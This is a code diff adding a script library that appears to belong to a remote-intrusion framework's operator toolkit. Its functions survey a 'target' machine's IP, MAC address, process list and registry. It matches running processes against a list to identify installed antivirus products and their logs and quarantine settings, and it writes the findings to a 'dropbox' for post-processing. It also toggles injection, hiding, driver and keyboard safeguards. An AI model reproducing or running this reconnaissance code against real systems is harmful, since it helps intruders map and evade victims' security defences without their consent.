@@ -1,0 +1,476 @@
+@include "DropboxAPI.epm";
+
+#struct used to handle the Meta Data 
+struct metaData{
+	string $ip;
+	string $ipw;
+	string $mac;
+	string $vendor;
+	string $product;
+	string $version;
+	string $installDate;
+	string $defUpdates;
+	string $logFile;
+	string $quarantine;
+	string $information;
+	string $projectName;
+	string $driveLetter;
+	string $prepsDir;
+	string $logdir;
+	bool $history;
+}
+
+#hash used to handle environment variable safeguards
+string %envs;
+
+#This function should be called right after instantiating a metaData struct.
+#We will fill in as much information as we can to reduce the number of function calls
+sub init(REF metaData @metaData)
+{
+	myIP(@metaData.$ip,@metaData.$ipw);
+	getPathInfo(@metaData.$driveLetter,@metaData.$prepsDir);
+	#set project name to unknown for now
+	@metaData.$projectName = "unknown";
+	getProjectName(@metaData);
+	getHistory(@metaData);
+
+	#Things we can't get yet, set to ""
+	@metaData.$vendor = "ERROR";
+	@metaData.$product = "NTR";
+	@metaData.$version = "NTR";
+	@metaData.$installDate = "NTR";
+	@metaData.$defUpdates = "NTR";
+	@metaData.$logFile = "NTR";
+	@metaData.$quarantine = "NTR";
+	@metaData.$information = "NTR";
+
+	# KLUDGE
+	@metaData.$logdir = "@metaData.$driveLetter\\logs\\@metaData.$projectName\\@metaData.$ip";
+	
+	#we also want the MAC Address from the target
+	@echo off;
+	@record on;
+	`ipconfig`;
+	int $index = GetCmdData("ipAdaptIndex");
+	string $tempMAC = GetCmdData("ipAdaptPhysAddr"); 
+	string $tempIP;
+	int $counter = 0;
+	int $i;
+	foreach $i($index){
+		$tempIP = GetCmdData("ipAdaptIP_$i");
+		#have to check for multiple IP's attached to a single NIC
+		string $multiNIC;
+		foreach $multiNIC($tempIP){
+			#echo "$tempMAC[$counter] = $multiNIC";
+			if( $multiNIC == @metaData.$ip){ 
+				@metaData.$mac = $tempMAC[$counter]; 
+				#we've found what we are looking for, bail
+				return TRUE;
+			}
+		}
+		$counter++;
+	}
+	#Well this is unfortunate. We can't find an IP-to-MAC match.
+	#We will take the MAC of the first NIC
+	@metaData.$mac = $tempMAC[0];
+	@record off;
+	@echo on;
+}
+
+#This function should be called right after instantiating a metaData struct.
+#We will fill in as much information as we can to reduce the number of function calls
+sub init(REF metaData @metaData, REF string %envs )
+{
+	#failsafe setting, all safeguards are on
+	%envs{'noInject'} = "TRUE";
+	%envs{'noRegistry'} = "TRUE";
+	%envs{'noHide'} = "TRUE";
+	%envs{'noDriver'} = "TRUE";
+	%envs{'noKeyboard'} = "TRUE";
+	%envs{'noProcInfo'} = "TRUE";
+
+	init(@metaData);
+}
+
+#returns the drive letter from the LP environment variable. Includes the :
+#Also returns path to preps with the assumption it is located under \preps
+sub getPathInfo(OUT string $driveLetter, OUT string $prepsDir)
+{
+	string $dir = GetEnv("RESOURCESDIR");
+	string $broke = split("\\",$dir);
+	$driveLetter = $broke[0];
+	$prepsDir = "$broke[0]\\$broke[1]\\preps";
+}
+
+#checks to see if there is an existing pspConfig.txt file for the project in quesion.
+sub getHistory(REF metaData @metaData)
+{
+	@echo off;
+	if(`local fileperms -file "@metaData.$prepsDir\\@metaData.$projectName\\@metaData.$ipw\\pspConfig.txt"`)
+	{ @metaData.$history = TRUE; }else{ @metaData.$history = FALSE; }
+}
+
+#This function creates the meta data file in the correct XML Schema
+sub writeMetaData(IN metaData @metaData)
+{
+	string $toWrite = "";
+	$toWrite = "<psp>\r\n<ip>@metaData.$ip</ip>\r\n";
+	$toWrite = "$toWrite<mac>@metaData.$mac</mac>\r\n";
+	$toWrite = "$toWrite<vendor>@metaData.$vendor</vendor>\r\n";
+	$toWrite = "$toWrite<product>@metaData.$product</product>\r\n";
+	$toWrite = "$toWrite<version>@metaData.$version</version>\r\n";
+	$toWrite = "$toWrite<installDate>@metaData.$installDate</installDate>\r\n";
+	$toWrite = "$toWrite<defUpdates>@metaData.$defUpdates</defUpdates>\r\n";
+	$toWrite = "$toWrite<logFile>@metaData.$logFile</logFile>\r\n";
+	$toWrite = "$toWrite<quarantine>@metaData.$quarantine</quarantine>\r\n";
+	$toWrite = "$toWrite<information>@metaData.$information</information>\r\n</psp>";
+
+	ifnot(WriteFile("@metaData.$logdir\\pspInformation.txt",TRUE,$toWrite)){
+		echo "\r!!!Function writeMetaData could not write pspInfo to local disk!!!\r";
+	}
+}
+
+sub writeMetaData(IN metaData @metaData, IN string %envs)
+{
+	setEnvs(%envs);
+	writeMetaData(@metaData);
+}
+
+#This function opens the XML results file
+sub openMetaData(IN metaData @metaData)
+{
+	string $toWrite = "<pspInformation>\r\n";
+	ifnot(WriteFile("@metaData.$logdir\\pspInformation.txt",TRUE,$toWrite)){
+		echo "\r!!!Function openMetaData could not write pspInfo to local disk!!!\r";
+	}
+}
+
+#This function closes the XML results file
+sub closeMetaData(IN metaData @metaData)
+{
+	string $toWrite = "</pspInformation>\r\n";
+	ifnot(WriteFile("@metaData.$logdir\\pspInformation.txt",TRUE,$toWrite)){
+		echo "\r!!!Function closeMetaData could not write pspInfo to local disk!!!\r";
+	}
+	#06/18/2009 - put a copy in the dropbox for post processing reasons
+	CopyLocalFileToDropbox("PSP","@metaData.$logdir\\pspInformation.txt");
+}
+
+#Called to compare historic config versus the running config
+#Argument 1 is a string that represents the currently running PSP config
+#Argument 2 is the IP the target is post-processed under
+sub checkConfig(IN string $currentValue, IN metaData @metaData)
+{
+	#we still want to write the current config to disk. do that now
+	createConfig($currentValue,@metaData);
+	
+	string $PSPHistory = "";
+	@echo off;
+	#paranoia check
+	ifnot(`local fileperms -file "@metaData.$prepsDir\\@metaData.$projectName\\@metaData.$ipw\\pspConfig.txt"`){
+		@echo on;
+		echo "\r\r!!!In function checkConfig\rThe file @metaData.$prepsDir\\@metaData.$projectName\\@metaData.$ipw\\pspConfig.txt doesn't appear to exist.\rThis shouldn't happen!.";
+		return FALSE;
+	}else{
+		ifnot(ReadFile("@metaData.$prepsDir\\@metaData.$projectName\\@metaData.$ipw\\pspConfig.txt",$PSPHistory)){
+			@echo on;
+			echo "\r\r!!!In function checkConfig\rCan't read @metaData.$prepsDir\\@metaData.$projectName\\@metaData.$ipw\\pspConfig.txt\rMakes comparing values difficult!";
+		}else{
+			string $line;
+			foreach $line($PSPHistory){
+				if($line == $currentValue){ return true; }
+			}
+			#They have changed something!
+			return false;
+		}
+	}
+}
+
+#This function should be called when the target has no pspConfig.txt file
+#Argument 1 is a string that represents the currently running PSP config
+#Argument 2 is the IP the target is post-processed under
+sub createConfig(IN string $currentValue, IN metaData @metaData)
+{
+	ifnot(WriteFile("@metaData.$logdir\\pspConfig.txt",TRUE,$currentValue)){
+		echo "\r!!!In function createConfig\rCould not write current PSP settings to local disk!!!";
+		return FALSE;
+	}
+	#echo "Just wrote data to @metaData.$logdir\\pspConfig.txt";
+	return TRUE;
+}
+
+#Determine the IP the target is post-processed under
+#Returns the IP in the first variable
+#Returns the IP with w appended in the second variable
+#The second is needed because of string limitations in EP
+sub myIP(OUT string $IP, OUT string $IPw){
+	@echo off;
+	@record on;
+	`getdirectory  -logs`;
+	string $line = GetCmdData("dir");
+	@echo on;
+	@record off;
+	string $temp = split("\\",$line);
+	$IP = $temp[3];
+	$IPw = "w";
+	$IPw = "$IP$IPw";
+}
+
+#This function will determine the project name from the preps directory
+#If they have two folders in the preps directory, we make them choose which one they want
+#We return the project name
+#this function should only be called by checkPSP.eps due to the use of the struct
+#A generic function can be found in GenericFunctions.epm
+sub getProjectName(REF metaData @metaData)
+{
+	@record on;
+	@echo off;
+	if(`lpgetenv -option PROJECTNAME`){
+		#variable already set. that was easy
+		@metaData.$projectName = GetCmdData("value");
+		return true;
+	}	
+	`local dir @metaData.$prepsDir\\*`;
+	string $folderList = GetCmdData("name");
+	bool $folderProperty = GetCmdData("isDir");
+	@record off;
+	@echo on;
+	string $foo;
+	int $i = 0;
+	int $x = 0;
+	while($x<sizeof($folderList)){
+		#ignore non-folders and the . and .. files
+		ifnot($folderList[$x] == "." || $folderList[$x] == ".."){ 
+			if($folderProperty[$x]){
+				@metaData.$projectName[$i] = $folderList[$x];
+				$i++;
+			}
+		}
+		$x++;
+	}
+	#they might have more than one folder in the preps directory. catch that here
+	if(sizeof(@metaData.$projectName)>1){ 
+		#not sure why they have 2, but we'll accomodate
+		echo "I've found more than 1 possible project names in the preps directory\rHelp me to help you"; 
+		$i=0;
+		while($i<sizeof(@metaData.$projectName)){
+			echo "[$i] @metaData.$projectName[$i]";
+			$i++;
+		}
+		$i = GetInput("Which name is correct?");
+		$foo = @metaData.$projectName[$i];
+		undef(@metaData.$projectName);
+		@metaData.$projectName = $foo;
+	}
+	if(@metaData.$projectName == "unknown"){
+		#prompt user for projectname. we don't really need it here, but other scripts probably will
+		@metaData.$projectName = GetInput("Please enter the project name now. Prep4op to avoid this");
+	}
+	`lpsetenv -option PROJECTNAME -value @metaData.$projectName`;
+	return TRUE;
+}
+
+#Compares the processlist against the elist in an effort to identify running PSPs
+#For each found PSP, we check to see if a corresponding script exists
+#Those that do are placed in the first variable, toRun
+#All others are returned in toCreate
+#Use of hash removes duplicate entries
+sub checkProcList (REF string %toRun, REF string %toCreate, IN string $driveLetter){
+#sub checkProcList (REF string %toRun, REF string $toCreate, IN string $driveLetter){
+	#-----------------------------------
+	# Get the processlist
+	#-----------------------------------
+	@echo off;
+	@record on;
+	ifnot (`log processlist`) {
+		echo "Couldn't get Processlist";
+		return false;
+	}
+	@record off;
+
+	int $ids = GetCmdData("id");
+	string $names = GetCmdData("name");
+
+	#-----------------------------------
+	# Get the scripts directory
+	#-----------------------------------
+	@record on;
+	ifnot (`getdirectory -scripts`) {
+		echo "Couldn't get directory";
+		return false;
+	}
+	@record off;
+	string $scripts_path = GetCmdData("dir");
+
+	#------------------------------------------------------
+	# For each process, get it's description from elist.txt
+	#------------------------------------------------------
+	int $i=0;
+	#x is used as a counter for tracking how many we don't have scripts for
+	int $x=0;
+	while ($i < sizeof($ids)) {
+		#echo "Checking $names[$i]";
+		@echo off; @record on;
+		`local grep -mask elist.txt -pattern $names[$i] -path $driveLetter\\OPSDisk\\Resources\\EP -unicode`;
+		@record off; @echo on;
+		string $match = GetCmdData("line_data");
+		if (defined $match ) {
+			#----------------------------------------
+			# Get name between the exclamation points
+			#----------------------------------------
+			string $parts = Split(":\t\t\t\t\t\t",$match);
+			string $psp = Split("!!!", $parts[1]);
+			string $process = $parts[0];
+			#----------------------------------------------------------------------
+			# NOTE: The elist must match EXACTLY. Not just regular expression match
+			#----------------------------------------------------------------------
+			bool $exactMatch = false;
+			if($process == $names[$i]) {
+				$exactMatch = true;
+			} else {
+				# echo "$process didn't EXACTLY match $names[$i]. Skipping it";
+				$exactMatch = false;
+			}
+			if ( defined $psp[1] && $exactMatch ) {
+				string $cleanName = Split(" ", $psp[1]);
+				$cleanName = $cleanName[1];
+				#--------------------------------
+				#If exists, place in toRun
+				#--------------------------------
+				if(`local fileperms -file $scripts_path\\psp\\$cleanName[1].eps`) {
+					%toRun{'$cleanName[1]'} = "$cleanName[1].eps";
+				} else {
+					%toCreate{'$cleanName[1]'} = "$cleanName[1]";
+					#string $clean = split(":\t\t\t\t\t",$match);
+					#$toCreate[$x] = "$clean[0] $clean[1]";
+					#$x++;
+				}
+			}
+		}
+		$i++;
+	}
+}
+
+#Takes a hash of PSP's that were identified as running and we have a script for
+#Simply kicks off each script in turn
+sub runList(IN string %toRun)
+{
+	string $line;
+	foreach $line(keys %toRun){
+		`script PSP\\%toRun{'$line'}`;
+	}	
+}
+
+#Takes a hash of PSP's that were identified as running and we DO NOT have a script for
+#Simply show this information on the screen
+#sub createList(IN string %toCreate)
+#sub createList(IN string $toCreate, IN metaData @metaData)
+sub createList(IN string %toCreate, IN metaData @metaData)
+{
+	echo "I noticed these PSPs running, but there are no scripts implemented yet:";
+	string $key;
+	foreach $key(keys %toCreate){
+		@metaData.$vendor = $key;
+		writeMetaData(@metaData);
+		echo "$key";
+	}
+	echo "\r";
+}
+
+sub setEnvs(IN string %envs)
+{
+	string $key;
+	string $currValue;
+	foreach $key(keys %envs)
+	{
+		if(%envs{'$key'} == "TRUE")
+		{
+			@echo off;
+			`lpsetenv -option $key -value "TRUE"`;
+		}
+	} 
+}
+
+
+# values = the values from the subkey that you are looking for
+# ret = return values (in an array)
+# error = do you want to halt on query errors
+sub reg_query(IN string $subkey, IN string $search_values, OUT string $ret, IN bool $error)
+{
+	string $values;
+	string $value;
+	string $value_data;
+	bool $got_error = false;
+	int $i=0;
+	int $j=0;
+	@record on;
+	#echo "regquery -hive L -subkey \"$subkey\"";
+	if(`regquery -hive L -subkey "$subkey"`)
+	{
+		$values = GetCmdData("value");
+		$value_data = GetCmdData("value_data");
+		
+		int $size = sizeof($values);
+		int $size_search = sizeof($search_values);
+		
+		if($size_search > $size)
+		{
+			$got_error = true;
+		}
+
+
+		string $search_value;
+		$i=0;
+		foreach $search_value ($search_values)
+		{
+			$j=0;
+			bool $found_value = false;
+			foreach $value ($values)
+			{
+				if($value == $search_value)
+				{
+					$ret[$i] = $value_data[$j];
+					$found_value = true;
+					break;
+				}
+				$j++;
+			}
+			$i++;
+			ifnot($found_value)
+			{
+				echo "ERROR: Did not find value \"$value\" in subkey \"$subkey\"";
+				$got_error = true;
+				break;
+			}
+		}
+	}
+	else
+	{
+		if($error)
+		{
+			echo "";
+			echo "Cannot query \"$subkey\".";
+			echo "regquery -hive L -subkey \"$subkey\"\n";
+
+			if(prompt "Continue")
+			{
+				return false;
+			}
+		}
+		else
+		{
+			return false;
+		}
+	}
+	@record off;
+
+	if($got_error)
+	{
+		$ret = "ERROR!!!";
+		return false;
+	}
+
+
+	return true;
+}
+
